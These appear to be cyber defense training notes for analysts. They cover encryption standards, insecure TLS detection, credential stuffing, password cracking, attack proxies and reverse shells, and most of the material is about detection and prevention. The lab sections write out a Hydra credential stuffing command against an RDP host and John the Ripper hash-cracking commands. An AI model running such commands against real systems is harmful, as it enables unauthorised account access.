Encryption Best Practices
﻿

NIST recommends AES or 3DES for block cipher usage. Previously, Skipjack and DES were approved algorithms, but NIST rescinded support for these as they were deemed to be insecure. The minimum key length for block ciphers should be 112 bits (DES effectively only had a key length of 56).

﻿

NIST also has 14 approved encryption modes. Encryption confidentiality modes, while providing for confidentiality, may not prevent attackers from modifying encrypted data in transit. Confidentiality modes include:

ECB mode – Do not use this mode
CBC mode
Counter mode (CTR)
Cipher Feedback mode (CFB)
Output Feedback mode (OFB)
These five modes are defined in NIST's Special Publication (SP) 800-38A. Other modes that also provide for authentication are known as Authenticated Encryption with Additional Data (AEAD) modes and include:

Galois Counter Mode (GCM) 
Cipher block Chaining-Message authentication code (CCM)
For asymmetric encryption, NIST recommends using:

Digital Signature Algorithm (DSA)
Rivest Shamir Adelman (RSA) algorithm
Elliptic Curve Digital Signature Algorithm (ECDSA)
NIST recommends a minimum key length of 2048 for RSA keys and 256 bits for ECC keys.

---------------------------------

Detecting Insecure Cryptography over the Network
To establish a secure channel over the internet with no prior knowledge of who the person is, three things are needed:

Key exchange: A method to secure exchange keys.

Bulk encryption algorithm: Encrypts most of the communications.

Message Authentication Code (MAC): A method to verify integrity of the message that is transmitted with the message.

Key exchange functions use asymmetric encryption. Diffie-Hellman (DH) key exchange is a popular method used to exchange keys and can technically be used for PKI, but is usually not, which is why DH does not provide for authentication. RSA is the dominant PKI algorithm in the market, which uses Certificate Authorities (CA) to verify the authenticity of entities on the internet, and can also be used for key exchange. DH and RSA are often used together to authenticate individuals and exchange keys.

﻿

The bulk encryption encrypts most of the communications, which may contain a lot of data. It needs to be fast, which asymmetric encryption is not. Symmetric ciphers are often thousands of times faster than asymmetric algorithms. This is why asymmetric encryption is used to share a symmetric cipher key or a session key. The session key is used with a symmetric encryption algorithm to encrypt the session.

﻿

The MAC ensures that the message was not changed between the sender and receiver. This is where hashes come in; the session key is combined with the data, and then the hash is calculated and transmitted along with the ciphertext. This ensures that only the sender or receiver could have been communicants of the session, as the session key is needed to generate the correct hash. The process described here is actually a hash-based message authentication code or HMAC. There are other methods of generating MACs that are not covered in this lesson.

﻿

These components — asymmetric encryption, symmetric encryption, and hashing — all work together to provide secure communications over the network.

﻿

Transport Layer Security (TLS) is a protocol that secures traffic from prying eyes and handles the implementation of the different types of cryptography. TLS is the successor to Secure Socket Layer (SSL). While originally developed with web browsing in mind, TLS can be used for much more than for HTTP security; it can secure many other protocols as well.

﻿

In the following lab, the transport protocols that secure communications over the network and their underlying cipher-suites using Zeek SSL logs are examined.

------------------------------------------------

Insecure Transport Encryption Protocols
Scrolling down the results, notice that ch-exch2.vcch.lan is using TLSv1.0, which is a deprecated version.


![image](https://github.com/user-attachments/assets/15a63ec9-886a-4642-9c60-ed7027b9997c)


-----------------------------------------------

Detecting Insecure Cryptography over the Network Recap
In the lab, hosts in a network using insecure versions of SSL/TLS in Zeek SSL logs were examined. You also examined how different cryptographic tools come together to secure communications in a cipher suite.

﻿

Network Cryptography Best Practices
﻿

Only use TLS versions 1.2 and TLS 1.3, if possible. Other versions have been found to be vulnerable to different attacks. These settings can easily be configured in the web browser for clients. The con figuration pr ocess may vary for hosting servers, and it may be best to consult vendor documentation to appropriately configure these settings.

-------------------------------------

Attacks on Weak Cryptography
A user in the mission partner's network mentioned that they have been a victim of identity theft despite using encryption over the network. The mission partner requested CPT assistance to get to the bottom of the issue. The senior host analyst on the team suspects there may be an issue with weak encryption. Investigate why the client may be experiencing data theft.

----------------------------------------------


####### CDAH-M7L6 Credential Stuffing/Password Cracking #######

Credential Stuffing and Password Cracking Overview
This section explains what credential stuffing and password cracking are and how they work via two labs designed to demonstrate an attacker performing these activities. It is important for Cyber Protection Team (CPT) analysts to understand these techniques so they can detect and prevent them.

﻿

Credential Stuffing
﻿

﻿

﻿

MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) lists credential stuffing (T1110.004) as a sub-technique of brute force (T1110). Credential stuffing is the act of trying to authenticate to a service using a list of known usernames and passwords often obtained from a breach dump for a different service. This activity is automated using custom scripts or third-party tools. A credential stuffing attack is successful due to password reuse. Passwords are often reused across services because it is difficult to remember them for all the services they use.

﻿

The majority of credential stuffing tools are similar. They use different techniques for executing the attack, but essentially take a list of usernames and passwords, use them against a service, and alert the adversary if they worked.

﻿

This lesson does not get into the details of what credential stuffing tools exist or how to use them because this knowledge is not required for a CPT analyst to be successful at detecting and preventing this attack.

﻿

Password Cracking
﻿

﻿

﻿

There are several password cracking techniques used by adversaries. These are often done on the adversary's local machine, a specially designed cracking machine, or a cluster of machines working together. 

Brute-force: A brute force attack occurs when the character set and string length are chosen. The tool hashes every combination of those characters and compares them to the hash it is attempting to crack in an attempt to find a match.

Dictionary attack: A dictionary attack uses a list of strings that are most likely to be a match. The tool hashes all these strings and compares them to the hash it is trying to crack in an attempt to find a match.
Hybrid dictionary and rule-based dictionary attacks are variations of the dictionary attack and are not covered in this lesson.

Rainbow tables: Rainbow tables are pre-computed tables of hashes and their associated un-hashed strings. Using a rainbow table replaces the need for a large amount of memory with a need for a large amount of storage because the tables are very large. Salting passwords makes it near-impossible to use rainbow tables because the same passwords never have the same hash.

---------------------------------------------

Performing Credential Stuffing
Conduct a successful credential stuffing attack against the Remote Desktop Protocol (RDP).

﻿

Workflow

﻿

1. Log in to the kali-hunt Virtual Machine (VM) using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open the terminal.

﻿

3. View the contents of /home/trainee/Desktop/lists/user-pass.txt.

(trainee@dmss-kali)-[~] $ cat -n ~/Desktop/lists/user-pass.txt
﻿

This file contains a list of colon-separated usernames and passwords. The -n flag tells the cat command to also print line numbers. According to the line numbers, there are 21 username:password pairs in this list. The list is used in the following steps to perform a credential stuffing attack.



![image](https://github.com/user-attachments/assets/290cf755-09cc-4742-987e-10e5c3b45819)


4. Use Hydra on the file user-pass.txt to perform a credential stuffing attack against 172.35.14.2 on port 3389 (RDP).
(trainee@dmss-kali)-[~] $ hydra -C ~/Desktop/lists/user-pass.txt rdp://172.35.14.2



A match was found:



![image](https://github.com/user-attachments/assets/791844bd-2738-4b6a-a30c-de256bfc2922)


Using a list of known usernames and passwords, Hydra was able to test them all and find a match for the RDP credentials of the account helpdesk.

-------------------------------------------------------

Performing Password Cracking
Execute a password cracking attack against a list of Message Digest 5 (MD5) hashes. MD5 is an older hashing algorithm that should not be used to hash passwords. MD5 suffices for this lesson because learning password cracking does not require the use of complex hashes.

﻿

Workflow

﻿

1. Log in to the kali-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Execute the following command to view the contents of /home/trainee/Desktop/hashes/hashes.txt.

(trainee@dmss-kali)-[~] $ cat ~/Desktop/hashes/hashes.txt
﻿

This is a list of MD5 hashes that are fed into a cracking tool:



![image](https://github.com/user-attachments/assets/d3823bdf-8d92-4a5f-bb28-6412c3a0c933)


3. Use John the Ripper (John) to attempt to crack these hashes using the wordlist rockyou.


The wordlist rockyou is included in Kali by default. It is based on the 2009 data breach suffered by a small social media company Rockyou. The database contained approximately 32 million passwords, and after several years of refining and curating, it has been shortened to 14 million passwords, making an attack based on this wordlist much faster to complete.
(trainee@dmss-kali)-[~] $ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt ~/Desktop/hashes/hashes.txt



![image](https://github.com/user-attachments/assets/6485b194-eb8c-47c2-b29e-1f6228d252c9)

4. Execute the following command using the --show flag to view the cracked passwords.
(trainee@dmss-kali)-[~] $ john --show --format=raw-md5 ~/Desktop/hashes/hashes.txt



![image](https://github.com/user-attachments/assets/89786f60-e440-4fe7-be24-5520cc45fde5)



John was able to crack some, but not all, of the hashes. It can only crack the hash if the password is part of the wordlist used. John can also be configured to use a brute force attack (trying all possible character combinations), but this type of attack takes much longer and is less likely to produce many, if any, additional cracked passwords unless the attacker has access to massive computing resources.


Using John against the wordlist rockyou, the attack was able to crack several MD5 hashed passwords.


![image](https://github.com/user-attachments/assets/ca9e6728-9da5-4ebe-8081-f6c2aeaa6ac7)


![image](https://github.com/user-attachments/assets/f39fd856-c729-45ea-8e1f-a84fa68c0e25)

--------------------------------------

Detecting Credential Stuffing and Password Cracking
Detecting Credential Stuffing
﻿

Credential stuffing can be detected by several Windows event Identifiers (ID), depending on the service being attacked. Credential stuffing attacks directed at Windows services are going to produce a spike in the event ID 4624 "An account was successfully logged on."

﻿

Once it is determined that a credential stuffing attack occurred, event ID 4625 "An account failed to log on" is searched near the timeframe of the attack to determine if the adversary was unsuccessful in authenticating.

﻿

Below are additional event IDs that can be used to further investigate credential stuffing attacks on other services. These can be used in unison with 4624 and 4625.

Remote Desktop Protocol (RDP)
4624 and 4625
RDP uses logon types of 3 "Network" and 10 "RemoteInteractive/Terminal services."
Sysmon 3 "Network traffic"
Excessive connections to port 3389.
Server Message Block (SMB)
3 "Network traffic"
Excessive connections to port 445.
5140 "Network share object was accessed"
This ID can help determine what object the adversary accessed.
5168 "Service Principal Name (SPN) check for SMB/SMB2 failed"
This ID can be a sign of a malicious authentication attempt.
Windows Remote Management (WinRM)
3 "Network connection"
Excessive connections to port 5985.
80 "Processing request" and 143 "Response processing"
These IDs indicate the resource requested and whether the operation was successful or not.
166 "User authentication"
This ID indicates which authentication method was used.
Detecting Password Cracking
﻿

Password cracking happens on the adversary's machine. Custom-built machines are used that utilize powerful graphics cards to speed up the process. Instead of focusing on detecting password cracking, a better angle is to focus on detecting hash dumping and the exfiltration of hashes to the adversary machine.

------------------------------------

Detecting Credential Stuffing
Execute a credential stuffing attack toward RDP.

﻿

The CPT has been assigned to hunt for credential stuffing activity. The time range is Nov 15, 2021 @ 12.30.00.000 -> Nov 15, 2021 @ 13.30.00.000.

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome.

﻿

3. Select the Discover - Elastic bookmark.

﻿

4. Log in to Security Onion using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Run a search for the specified time range: Nov 15, 2021 @ 12:30:00.000 -> Nov 15, 2021 @ 13:30:00.000.



![image](https://github.com/user-attachments/assets/be5b5522-da3b-4efa-a1a4-b92c4a675c1e)

6. Enter the following search term to locate failed logons.
event.code: 4625


![image](https://github.com/user-attachments/assets/2fe28cb6-114f-4ae8-845f-4e3bcfd18dfd)

7. View the winlog.logon.type field to see what logon type these logs have.


![image](https://github.com/user-attachments/assets/2ba1615c-4c99-4105-a991-7729f5bcd901)



All the logs in the current dataset have a logon type of Network. Network is one of the logon types that is associated with credential stuffing activity.


8. On the bar chart, select the time period showing activity by dragging the cursor over the desired segments. The number of hits returned may differ from the figures due to the exact time period highlighted.


![image](https://github.com/user-attachments/assets/42231be2-69fa-4d41-9d98-718f21969937)



9. Enter host.name in the search field names box.


10. Select host.name from the Available fields.



![image](https://github.com/user-attachments/assets/e3d740f0-d68c-4eda-a4dc-a9e14dd75d9c)


The hosts with failed logins are displayed. In this case, the only host listed is CH-UTIL-1.vcch.lan.


11. Add event.code ID 3 and the hostname to the search.
event.code: (4625 OR 3) AND host.name: "ch-util-1.vcch.lan"



![image](https://github.com/user-attachments/assets/1215743d-c89a-4ec4-be8d-9f2fc21c47be)


The network traffic during the time of the attack is displayed.


12. Enter destination.port in the search field names box.


13. Select destination.port from the Available fields to see which port is being attacked.


![image](https://github.com/user-attachments/assets/4e44ac78-7829-46f1-a653-ec392bb9e6f9)



The attack is being directed at port 3389 (RDP).


14. Search for source.domain in the search field names box.


15. Select source.domain from the Available Fields to see what host is performing the attack. Source.domain is the default parsing used by winlogbeats.



![image](https://github.com/user-attachments/assets/5ef723d1-dd82-4ae6-8d1f-ccc83e8987d2)


The logs show 50% have the domain dmss-kal i  and 50% have a blank domain, which is indicated by a hyphen. This occurs because event.code 3 events do not have a resolved source hostname in the raw logs.


16. Look for successful logins by the source.domain during the attack time range.
event.code: 4624 AND source.domain: "dmss-kali"



The adversary appears to have been successful at gaining access to the account helpdesk. This should be reported.


The host dmss-kali successfully performed a credential stuffing attack toward port 3389 (RDP) and gained access to ch-util-1 using the credentials helpdesk. This breach should be reported.



![image](https://github.com/user-attachments/assets/7eb87d8b-8b45-48e1-a174-bc5e2c3af799)


![image](https://github.com/user-attachments/assets/6ebf83d2-09fa-4a29-9cb6-b5ae9d4841eb)

----------------------------------------------------

Preventing Credential Stuffing and Password Cracking
Preventing Credential Stuffing
﻿

Credential stuffing is successful as users often reuse the same username and password across services. Most users do not know that password reuse is a problem until it is too late. To minimize the likelihood of success for these attacks, users should be required to take basic cybersecurity awareness training at least once a year. 

﻿

Other important steps to prevent successful credential stuffing attacks include enforcing strong password policies that address the age, complexity, and reuse of passwords. It is also important to have termination policies in place to ensure swift removal of access when necessary.

﻿

If users are required to change their password on a regular basis, it minimizes the chance that they are using the same password as other services used. This causes problems with users because memorizing complex passwords is challenging. By providing access to a password manager, users can set very complex passwords without having to memorize them. All they need to remember is the one password that authenticates to the password manager.

﻿

Preventing Password Cracking
﻿

Implementation of a good password policy and user awareness training is key to preventing password cracking. If users are required to use complex passwords and are taught not to use passwords that contain personal information that can easily be found on social media, it makes cracking passwords much more expensive and time consuming for the attacker. The National Institute of Standards and Technology (NIST) recommends a minimum eight-character length for all passwords.

﻿

Another method is to salt the password hashes. If the hashes are dumped, they cannot be easily cracked. While salting does not make password cracking impossible it does make rainbow tables much less feasible for all but the most sophisticated government-backed adversaries. Salting hashes was covered in the lesson Attacks on Weak Cryptography.

------------------------------------------

Preventing Credential Stuffing and Password Cracking
The chances of successful credential stuffing and password cracking attacks are greatly reduced when a strong password policy is in place. The CPT has been assigned to audit the environment's password policy.

Workflow


1. Log in to the ch-dc1 VM using the following credentials:
Username: trainee
Password: CyberTraining1!



The network owner has provided the CPT with the requirements for the password policy: 
Enforce password history should be no less than 12 remembered passwords.Maximum password age should be no more than 60 days.Minimum password age should be 1 day.Minimum password length should be no less than 8 characters.Password must meet complexity requirements should be enabled.Store passwords using reversible encryption should be disabled.
2. Use the requirements above to audit the Password Policy in the Default Domain Policy on ch-dc1.


![image](https://github.com/user-attachments/assets/7ffc74ce-279f-4332-bd83-e42387e9362f)


![image](https://github.com/user-attachments/assets/6507cf85-b983-4a61-99b7-feb0c9b51c12)



![image](https://github.com/user-attachments/assets/35fbbc34-926f-44d4-8a19-2c5438337b10)


----------------------------------------------------------

###### CDAH-M7L7 Using an Attack Proxy #######


Attack Proxy Use Case
A proxy is a system that serves as an intermediary device between a source and destination. It also fully translates all protocols and traffic from the source to the destination as if the proxy was itself the source. This translation occurs verbatim or with a change in destination ports.

﻿

In normal network communications, a targeted mission partner observes all reconnaissance and attacks as coming directly from an attacker.

![image](https://github.com/user-attachments/assets/b2a93eaf-965c-485b-88db-56c5012b8ccb)

However, in the use case where an adversary values obfuscation, when a proxy is employed, the targeted mission partner observes that traffic as coming directly from an entirely different device.


![image](https://github.com/user-attachments/assets/d8599b42-4863-40c8-9351-3d3d6b4701f0)

Why Are Attack Proxies Used?


A threat adversary uses attack proxies to prevent a mission partner’s defenders from identifying the true source of the attack. This attack origin defense is known as obfuscation. At times, this type of obfuscation is purposeful misdirection by choosing attack proxies in associated networks or geographical regions of other malicious actors.


The use of an external proxy for Command and Control (C2) by an attacker is described in the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework sub-technique T1090.002, which is especially valuable in obfuscating the source of critical C2 servers. 


"Sub-technique T1090.002: External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server."


These technologies are often employed by sophisticated actors and are often expensive to construct and maintain, so preserving the secrecy of their communications is a priority.


Limitations 


While valuable, obtaining and employing attack proxies is not without challenges. Attack proxies require significant resources to acquire and make reliable. They may also add complexity and additional operational time when attacking and accessing targets networks. Each of these limitations is explained below.


Resources


The use of a proxy requires an investment of time to identify and compromise appropriate targets for use as proxies, or money, and to purchase Virtual Private Servers (VPS) or Virtual Private Network (VPN) access, each of which have their own trails to follow to enable identification of the attackers. Sophisticated threat actors purchase or compromise devices that are in geographic proximity or logically adjacent to target networks, while other less sophisticated or resourced attackers use any available system and freely burn those proxies to achieve their goals. 


Reliable Access


If an attacker prioritizes stealth, it is difficult for them to achieve reliable access to compromised devices inside of the target network's trusted edge. External communications going into internal networks are often closely monitored and restricted, meaning that Bind shells are normally not a viable option. In that case, threat actors use connections that originate from within the target network, known as reverse connections, that can often circumvent perimeter defenses because traffic egressing from inside to outside a network boundary is not as carefully inspected or regulated. When using reverse connections, threat actors use protocols or protocol/port combinations that are likely to be allowed to traverse out, such as Hypertext Transfer Protocol Secure (HTTPS), Domain Name System (DNS), Internet Control Message Protocol (ICMP), or Simple Message Transfer Protocol (SMTP). Because initial attack connections can be more susceptible to discovery, threat actors often use separate attack proxies for initial compromise and sustained access operations such as C2.


Properly Configured Firewalls


If a defensive mechanism on a network's edge, such as a firewall, is properly implemented and configured, then defenders already have an advantage. Attribution of the source of an attack is secondary to stopping an attack. A properly configured firewall can make it difficult to communicate in to or out of a network. Attack proxies can help attackers shape the traffic to circumvent any rules that are blocking traffic but the difficulty of determining what traffic is allowed through increases the greater the defensive posture of the target network.


Increased Time of Execution


Proxies are another stop along the path of network traffic. This makes any actions executed by the proxy take significantly more time than if natively run and sent from the source. This is in addition to the processing time that applications on both the original source of malicious traffic and the proxy take to package the traffic.

![image](https://github.com/user-attachments/assets/0c3380f4-4e44-45b3-971e-7062b65b772e)


--------------------------------------

Attack Proxy Methods
Methods Overview
﻿

Threat adversaries employ a number of different techniques to ferry traffic from an origin through an external proxy to the mission partner's infrastructure. These include the use of tunnels created by applications such as SSH or Netcat, proxies created by C2 infrastructure, Multi-Hop Proxies such as TOR, host firewall rules, and cloud services.

﻿

As the actual techniques employed to set up the reliable connections required to proxy traffic are identical to the techniques discussed in a later lesson on pivoting, this lesson discusses these ideas at a high level and focuses on how the externally proxied traffic appears to the mission partner.

﻿

Application Tunnels
﻿

Each of the following applications forwards traffic from a local destination port on the proxy to a remote destination port on a target. Some are able to proxy a variety of traffic with a single connection, others are limited to single ports and single destinations before requiring reconstruction for new services and targets.

﻿

Applications that proxy multiple types of services or targets at once tend to employ the Socket Secure (SOCKS) protocol, which is a session-layer Internet Protocol (IP) that facilitates the proxy of any network communication on the part of a client device. Recall from CDA-Basic that SOCKS proxies support both Transmission Control Protocol (TCP) and User Datagram Protocol (UDP), as well as newer versions with the ability to require authentication, such as SOCKS5.

﻿

Secure Shell
﻿

Adversaries who have authenticated access to the intermediary proxy device and have Secure Shell (SSH) running on the device as a service create a dynamic SSH port forwarding service, which tunnels all traffic sent through it by means of a SOCKS proxy. If credentials are available on the proxy server, this is one of the most powerful and versatile options available. This leaves SSH logs on the proxy device, which, if not cleaned by the adversary, become another piece of evidence leading to potential attribution.

﻿

Socat and Netcat
﻿

These programs are often known as the Swiss Army knives of network service interaction and traffic redirection. They are highly versatile in sending and receiving a variety of data streams but are limited to one destination port and address at a time. This is very useful in proxying an attack that targets only one network service. Using these applications when proxying attacks becomes increasingly complicated (though not impossible) when dealing with multiple services, different callback ports, and dynamic high ports. These applications are powerful tools when predicting which port traffic returns to, and can meticulously create all the necessary tunnels, as the evidence of their operation exists solely in memory.

﻿

Other Applications
﻿

Additionally, custom scripts and applications continue to be developed with similar functionality. One example is the open-source project Chisel, which allows for single port forwarding similar to Socat, but creates a more dynamic SOCKS5 proxy when Chisel is running on both the attacker (client) device and proxy (server) device. 

﻿

C2 Infrastructure
﻿

Most C2 platforms include the ability to create and use SOCKS proxies for other C2 communications in their functionality. This essentially turns any device containing an active C2 implant, or client, into a potential redirector of attacker traffic. Many of these, such as PoshC2, Metasploit, Empire, and Cobalt Strike, enable the creation of SOCKS proxies on the implanted devices, which are equipped to receive and forward framework traffic. This traffic is often encrypted for maximum protection against detection until the last hop before the target, in which case having an authenticated SOCKS5 proxy is especially helpful. 

﻿

Multi-Hop Proxies
With sufficient time and resources available for an attack, threat adversaries gain greater obfuscation by chaining together multiple proxies in the communication flow of an attack. This is done manually by setting up multiple proxies in a series and configuring an application such as ProxyChains on the origin node. 

﻿

This is also commonly done through onion routing, which is a form of encrypted network communications. Onion routing prioritizes anonymity by restricting any node's understanding of the hops taken before or after it in a packet's travel. The most widely used and publicly available version of this is The Onion Router (TOR). This network has millions of users and thousands of network nodes and has been used for a great deal of MCA in the past due to its built-in anonymization. This serves the needs of an attacker desiring obfuscation without obtaining access to a proxy device. 

﻿

Due to its potential for proxying malicious traffic, all communications to and from TOR entry and exit nodes to public-facing mission partner systems need to be monitored, if not blocked outright.

﻿

Host Firewalls
﻿

Operating System (OS) host firewalls can be configured to redirect traffic directly from one external host to another. On Linux systems, this is usually conducted with the iptables or nftables utility, and on Windows systems, this is done with the netsh utility.

﻿

One drawback of this method is that, like the use of netcat, this form of redirection normally only proxies traffic to and from a specific port, rather than dynamically across all services. 

﻿

Cloud Infrastructure
﻿

Network services, data storage, desktops, and even MCA is increasingly moving to the cloud. A few providers only offer cloud hosting of files for websites and little else. Others offer much greater access such as allowing commands to be run on their devices, the opening of ports, and the starting of services. VPSs allow for complete control of the devices for a fee and essentially function as a client's own rented device.

﻿

Examples of cloud providers include Amazon Web Services (AWS), Microsoft Azure, Digital Ocean, and Linode. It is common in the Terms of Service (ToS) that these companies require clients to abide that no MCA be conducted from their services. Accordingly, contacting the service support of these companies to report abuse of their resources is a viable strategy, not only in stopping an on-going attack, but in gaining cooperation with a hunt or investigation. 

﻿

Attack Proxy Use
﻿

In order to practically explain how an attacker uses a proxy and identify through experience at least one of the limitations, use the provided attacker workstation to simulate a network scan with and without an attack proxy in place. After the simulation, observe  the differe nce in this traffic from the defender's perspective.


-------------------------------------------

Reviewing Network Logs
Since two network scans were issued from the attacker's workstation, a network capture to observe the differences between the two from the perspective of a defender's network sensor can be examined. Reviewing captures such as these is a routine task when conducting hunt or response actions to known threat activity. 

﻿

Use Arkime to examine the traffic produced by the normal and proxied scans conducted. In this inspection, recognize that the identity of the attacking workstation is obfuscated during the second scan.

---------------------------------------------

The Attribution Problem
Challenge of Attribution
﻿
Truly identifying the source of MCA is not guaranteed. Since no physical act occurred (although physically enabling attacks through access to network cables, Universal Serial Bus [USB] drives, workstations, etc. are possible), and the means to digitally cover one's tracks exist and are employed by the best attackers, this identification is extraordinarily hard and is known in cybersecurity circles as the attribution problem.

﻿

Proxies forward all network traffic as if it were their own, so it is impossible from the mission partner (receiving) side to conclusively identify the source. However, even when the identity cannot be confirmed, the use of Open-Source Intelligence (OSINT) tools identifies the source IP address as a VPN or TOR exit node, a VPS, a cloud-based server, or other infrastructure that was clearly used as a proxy by savvy actors. This piece of information gives insight into the sophistication of the threat actor and leads to possible points of contact in an investigation.

﻿

When cooperation with owners of the proxy system is possible, obtaining the logs of the compromised or co-opted system aids in an investigation. For example, if a threat actor purchased resources on a cloud server to conduct actions, obtaining the provider's cooperation in dumping command history, connection logs, file hashes, and other artifacts aids in forming consensus or deterring future actions, but still rarely results in a legally-sound conclusion. To impede potential legal cooperation with a cybersecurity investigation, sophisticated actors use multi-hop proxies in which the individual hops exist in differing jurisdictions — such as different countries — to prevent the sort of cooperation that leads to completing the entire picture of how an attack progressed. 

﻿

On occasion, these artifacts are left behind on the proxy or even compromised mission partner systems intentionally. This could be a form of misdirection on the part of a savvy actor, in which they employ the known operating tools and tradecraft of a different Advanced Persistent Threat (APT) to pass attribution toward that threat.

![image](https://github.com/user-attachments/assets/3e44a048-2d5e-413a-8d14-d5f98efb9262)


---------------------------------------

Mitigation
Because the identity of a malicious attacker is rarely concretely confirmed, the strongest mitigation to the use of attack proxies is not to find the attacker, but to defeat the methodology employed, regardless of its source.

﻿

Pyramid of Pain
﻿

This idea is encapsulated well in David Bianco's Pyramid of Pain.

﻿![image](https://github.com/user-attachments/assets/c99a48a7-8ea5-422e-9a15-83a5f2f27497)

The Pyramid of Pain is an excellent way of representing the defense problem that a proxy represents and the value of targeting attacker tools and techniques, rather than simply addresses, domains, or hashes (though these cannot be ignored when the intelligence is available).


The problem of blocking a source of an attack and thinking that is an effective mitigation is that the single network node is a renewable resource for a sophisticated attacker. As David Bianco explains when describing his pyramid, "If you deny the adversary the use of one of their IP addresses, they can usually recover without even breaking stride." 


Firewalls


Since not every possible proxy is individually blacklisted, meaning that all traffic from that address is blocked, it is helpful to configure edge defenses to mitigate methodologies (such as gratuitous port scanning) rather than mitigate attacks from individual sources. This is accomplished with the classic cybersecurity paradigm of only allowing intended traffic.


Blacklisting can work in cases where potential proxies are publicly known in advance. This is the case with the multi-hop proxy technique mentioned earlier that employs the onion routing protocol. It is acceptable to deny traffic from known TOR entry and exit nodes to prevent an adversary's use of the TOR network to anonymize an attack on mission partner infrastructure.


-------------------------------------------------

####### CDAH-M8L1-Interactive Shells #######


Shell Overview
﻿

Figure 8.1-1

﻿

When an attacker obtains Remote Command Execution (RCE) on a target server, it may be the "beginning-of-the-end" of an engagement, but the attacker could still be far from achieving their objectives.

﻿

Due to the nature of initial exploitation and code execution typically providing limited capabilities, an attacker is often required to convert their RCE to a stable interface with the attacked system as quickly as possible. This interface should include the following characteristics:

Be unhindered by network devices between an attacker and their target.

Offer stable, repeatable command execution on the affected system.

Return the output of the commands run by the attacker.

The simplest solution that offers all three characteristics is a stable command console from which the compromised device reaches out to the attacker. This solution is often referred to as a shell. A shell is an interface that allows a host to be accessed remotely. 

﻿

Generally, an exploit is the riskiest and noisiest part of any hacking operation. This is because it almost always and almost immediately results in the attacked system responding with some kind of behavior that was not intended by the network architects. Byproducts of exploiting a remote system could include:

Unforeseen logging.

File system modifications.

Application or system crashes.

Any of these byproducts listed could incriminate the attacker's activities in or against a target network.

﻿

Listening Shell
﻿

Consider a simple concept: the listening shell. This occurs when an exploit payload opens a port on the compromised device and directs input from connections on that socket to the system's native shell (usually /bin/sh or cmd.exe) through a system() or exec() call. There are some barriers to listening shells:

Listening shells are often an easier, basic tool for attackers, but are often inaccessible due to network security devices blocking incoming requests.

If a listening shell is started by an attacker and they cannot access it, it may remain listening indefinitely, which means the attacker needs another machine to create another listener.

Listening on ports that would be allowed by a firewall, etc., often require elevated privileges, which the initial exploit shell often does not have.

The original Netcat can be used to simulate this concept. The original build of Netcat featured a -e command argument, which would take the input from the socket and forward its stdin/stdout/stderr from the socket opened by Netcat to the executable specified in the option's argument and vice versa. Netcat and the -e argument are used in this lesson to establish a reverse shell. 

﻿

A shortcoming of configuring an exploit payload to force a target device to listen is that starting a listening shell is effective only if the targeted device accepts inbound traffic from the attacker device on arbitrary ports. This is rarely the case if there is a firewall or network address translation between the target and the attacker.

-----------------------------------------------------

Bind Shells
The most basic type of shell attackers often use to deliver a payload is a bind shell. Once initiated, the bind shell waits for communication from the attacker machine in order to execute specific commands. The communication port is often referred to as a listener. A key distinction with the bind shell framework is that the listener waits for an incoming connection, once a connection is made the attacker can connect to the listener and deliver the payload. The payload can be anything, such as malicious code or documents. 

﻿

In Figure 8.1-2, the attacker machine connects to a listening port located on the target machine. 

﻿
![image](https://github.com/user-attachments/assets/767247c6-e653-4735-90ac-a57c792188a0)

﻿

Figure 8.1-2

﻿

Bind Shell Key Components 
﻿

The following are key components of bind shells:

The attacker's host initiates the TCP 3-way handshake (or connection).

The shell is initiated by the victim host.

The target machine needs to have listening ports open and accessible so that the communications can reach the attacker machine.

A Network Address Translation (NAT) enabled machine prevents remote accessibility for the attacker machine. NAT is a networking component designed to conserve Internet Protocol (IP) addresses and allow machines to securely access the internet. 

---------------------------------------------------------------------


Reverse Shells
A reverse shell is similar to a bind shell; however, the TCP connection is initiated from the victim host to the attacker host. Once an attacker has exploited and gained command execution, a reverse shell can be leveraged to deliver payload and further their campaign. Additionally, unlike the bind shell, a reverse shell still functions across a NAT boundary, making it the preferred choice. The reserve shell functions because firewalls performing NAT are typically more permissive of internal hosts connecting to outside hosts, this is permitted and generates a mapping in the NAT table. This does not work the other way (in a bind shell) unless there is a static NAT mapping from outside to inside.

![image](https://github.com/user-attachments/assets/69e8c801-1f3c-4c3e-8fb3-ea7c63f3af4b)


In Figure 8.1-8, the victim machine initiates the TCP SYN connection requests a connection request. The attacker machine accepts the connection and sends commands. Once a connection is completed, the victim pipes the network connection to a command shell that allows the attacker to continue their activities and send additional payloads, if needed.


Reverse Shell Key Components 


The following are key components of reverse shells:
The target machine initiates the TCP connection to the attacker machine, connecting and communicating to the server. It is important to note that this is the opposite of the bind shell. 
The target machine must be directly accessible remotely from the attack machine.
The shell is initiated by the target host. 
A reverse shell functions regardless of a NAT in place, as long as not further limited by firewall rules or other network security devices. Attackers typically use common web ports as the destination for reverse shells so that firewall rules are more likely to permit the activity.

Methods of Establishing Reverse Shells


The following are a few methods of establishing a reverse shell on Windows:
PowerShell 
Python
Perl
Ruby

---------------------------------------------------

Non-Standard Listening or Connected Services or Ports
TCP and User Datagram Protocol (UDP) use port numbers to identify applications that hosts are utilizing and that communicate with each other. Communications are identified by their respective source and destination IP address and TCP/UDP port numbers. Port numbers can be any number between 1 and 65535; however, server applications are most commonly found below the value 1024. A few well-known ports are listed below:

TCP 20 and 21 (File Transfer Protocol, FTP)
TCP 22 (Secure Shell, SSH)
TCP 23 (Telnet)
TCP 25 (Simple Mail Transfer Protocol, SMTP)
TCP and UDP 53 (Domain Name System, DNS)
UDP 69 (Trivial File Transfer Protocol, TFTP)
TCP 80 (Hypertext Transfer Protocol, HTTP)
TCP 119 (Network News Protocol, NNTP)
TCP, UDP 139 (Windows File and Print Sharing)
UDP 161 and 162 (Simple Network Management Protocol, SNMP)
